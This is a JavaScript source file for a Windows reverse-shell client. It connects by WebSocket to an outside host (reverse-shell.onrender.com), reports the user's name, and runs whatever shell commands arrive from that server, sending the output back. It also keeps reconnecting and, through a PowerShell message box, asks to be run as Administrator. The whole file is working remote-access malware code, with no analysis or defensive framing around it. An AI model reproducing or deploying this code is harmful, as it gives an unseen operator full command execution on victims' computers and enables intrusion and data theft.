const nw = require('node-windows');
const clc = require("cli-color");
const { exec } = require('child_process');
var WebSocket = require('ws');

//const serverAddress = "ws://192.168.0.240:8080"
//const serverAddress = "wss://reverseshell-ondrejdostal007.b4a.run/"
const serverAddress = "wss://reverse-shell.onrender.com/"

const connect = () => {
  var ws = new WebSocket(serverAddress);
  ws.on('open', () => {
      console.log("> Websocket connection established.")
      console.log("> Connected to:", clc.cyan(serverAddress))
      ws.send(JSON.stringify({ type: "id", value: require("os").userInfo().username, accessCode: "tvojemama" }))
  });
  ws.on('message', function(msg) {
    //console.log("Received >", Buffer.from(msg.toString("utf8", 0, 25)).slice(0, -1))
    console.log(clc.blackBright("Received >"), msg)
    msg = JSON.parse(msg.toString())
    console.log("Parsed >", msg)
    switch(msg.type){
      case "msg":
        console.log(clc.bold("Message >", msg.value))
        break;
      case "exec":
        if(!msg.value) return ws.send(JSON.stringify({ type: "cmd", value: "no cmd", to: "web" }))
        exec(msg.value, (error, stdout, stderr) => {
          console.log(clc.bold('> Transmitting output..'));
          if (error) {
              console.log(clc.bold('> Transmission successfull.'));
              return ws.send(JSON.stringify({ type: "cmd", value: error.message, to: "web" }))
          }
          if (stderr) {
              console.log(clc.bold('> Transmission successfull.'));
              return ws.send(JSON.stringify({ type: "cmd", value: stderr, to: "web" }))
          }
          console.log(clc.bold('> Transmission successfull.'));
          return ws.send(JSON.stringify({ type: "cmd", value: stdout, to: "web" }))
        })
        break;
    }
  });

  ws.on("upgrade", (data) => {
    console.log("> Protocol upgraded from", clc.whiteBright("HTTP"), "to", clc.whiteBright("WSS."), data.statusCode)
  })
  ws.on("close", (data) => {
    console.log("> Connection closed.", data)
    console.log("Reconnecting..")
    connect()
  })
  ws.on("error", (err) => {
    console.log("ERROR", err)
  })
}
nw.isAdminUser(e => {
  if(e) return connect()
  exec(`PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Please run the program as an Administrator.', 'Error', 0, 16)"`, (error, stdout, stderr) => {
          if (error) {
              return console.log(error);
          }
          if (stderr) {
            return console.log(stderr);
          }
          return process.exit(0)
  })
})